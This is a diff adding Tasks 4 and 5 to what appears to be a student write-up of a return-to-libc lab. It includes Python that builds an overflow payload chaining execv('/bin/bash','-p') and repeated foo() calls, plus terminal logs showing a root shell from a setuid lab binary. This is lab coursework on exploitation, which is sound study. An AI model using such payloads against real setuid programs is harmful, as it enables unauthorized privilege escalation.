@@ -208,3 +208,116 @@ zsh:1: command not found: h
 Segmentation fault (core dumped)
 ```
 Since we have changed the filename we have thus changed the location of `/bin/bash` string inside our address space, so the argument we are passing to the `system()` function is most probably a non-valid string and hence we get the error `zsh:1: command not found: h`.
+
+## Task 4
+Here we are going to use `execv()` and the origianl `/bin/bash` with the `-p` argument so that it would give us a root shell. For that we need to call `execv()` with the `pathname` and `argv[]` arguments. so first of all we create the `/bin/bash` and `-p` strings in our buffer; then we create an array
+that it's first entry points to the `/bin/bash` location and it's second entry points to the `-p` location and it's third entry is four bytes of zero `NULL`.
+Now that we have all of this in our buffer, we put the address of `/bin/bash` as the first argument of `execv()` and the address of `argv[]` as the second arguement. The image below can hopefully make it all clear:
+![a](screenshots/badfile.png)
+
+### Python Code
+```python
+# important addresses:
+buffer_addr = 0xffffcebd
+ebp = 0xffffced8
+execv_addr = 0xf7e9a4b0  
+exit_addr = 0xf7e05f80  
+input_addr = 0xffffcef0
+
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(160))
+
+argv_pos = 64
+bin_bash_pos = 96
+dash_p_pos = 112
+
+Y = ebp -buffer_addr + 4
+Z = ebp - buffer_addr + 8
+X = ebp - buffer_addr + 12
+T = ebp - buffer_addr + 16
+
+content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')
+content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
+content[X:X+4] = (input_addr+ bin_bash_pos).to_bytes(4,byteorder='little')
+content[T:T+4] = (input_addr + argv_pos).to_bytes(4,byteorder='little')
+content[T+4:T+5] = (0).to_bytes(1,byteorder='little')
+
+
+# argv array which is [pointer_to_bin_bash,pointer_to_dash_p, NULL]
+content[argv_pos:argv_pos+4] = (input_addr + bin_bash_pos).to_bytes(4,byteorder='little')
+content[argv_pos+4:argv_pos+8] = (input_addr + dash_p_pos).to_bytes(4,byteorder='little')
+content[argv_pos+8:argv_pos+12] = (0).to_bytes(4,byteorder='little')
+
+# putting the actual strings in the buffer:
+content[bin_bash_pos: bin_bash_pos + 10] = "/bin/bash\0".encode('latin-1')
+content[dash_p_pos: dash_p_pos + 3] = "-p\0".encode('latin-1')
+
+
+# Save content to a file
+with open("badfile", "wb") as f:
+  f.write(content)
+```
+
+### Result
+```bash
+seed@seed:~/Desktop/return-to-libc-lab$ make
+gcc -m32 -DBUF_SIZE=15 -fno-stack-protector -z noexecstack -o retlib retlib.c
+sudo chown root retlib && sudo chmod 4755 retlib
+seed@seed:~/Desktop/return-to-libc-lab$ ./exploit.py 
+seed@seed:~/Desktop/return-to-libc-lab$ ./retlib 
+Address of input[] inside main():  0xffffcef0
+Input size: 160
+Address of buffer[] inside bof():  0xffffcebd
+Frame Pointer value inside bof():  0xffffced8
+bash-5.0# whoami
+root
+bash-5.0# exit
+exit
+```
+
+## Task 5
+In this task we should we should change the stack in a way that after we return from `bof()` we call `foo()` ten times and then we call `execv()`. Since `foo()`
+doesn't  have any input arguments our job is relatively easy. instead of writing the address of `execv()` in the return address of `bof()` we write the address of `foo()`, by looking at the table of task 3 we see that the return address of `foo()` is actually 4 bytes above. So we for 10 consecutive 4 bytes, we write the address of `foo()` and then shift everything else 40 bytes above; this is done in the script below: 
+
+```python
+# only showing the modified part:
+content = bytearray(0xaa for i in range(200 )) # +40 here
+
+argv_pos = 64 + 40 # +40 here
+bin_bash_pos = 96 + 40  # +40 here
+dash_p_pos = 112 + 40 # +40 here
+
+# calling foo() 10 times:
+for i in range(10):
+  content[ebp -buffer_addr + 4 + 4*i:ebp -buffer_addr + 8 + 4*i] = (foo_addr).to_bytes(4,byteorder='little')
+
+Y = ebp -buffer_addr + 4 + 40 # +40 here
+Z = ebp - buffer_addr + 8 + 40 # +40 here
+X = ebp - buffer_addr + 12 + 40 # +40 here
+T = ebp - buffer_addr + 16 + 40 # +40 here
+```
+### Result
+
+```bash
+seed@seed:~/Desktop/return-to-libc-lab$ ./exploit.py 
+seed@seed:~/Desktop/return-to-libc-lab$ ./retlib 
+Address of input[] inside main():  0xffffcef0
+Input size: 200
+Address of buffer[] inside bof():  0xffffcebd
+Frame Pointer value inside bof():  0xffffced8
+Function foo() is invoked 1 times
+Function foo() is invoked 2 times
+Function foo() is invoked 3 times
+Function foo() is invoked 4 times
+Function foo() is invoked 5 times
+Function foo() is invoked 6 times
+Function foo() is invoked 7 times
+Function foo() is invoked 8 times
+Function foo() is invoked 9 times
+Function foo() is invoked 10 times
+bash-5.0# whoami
+root
+bash-5.0# exit
+exit
+```
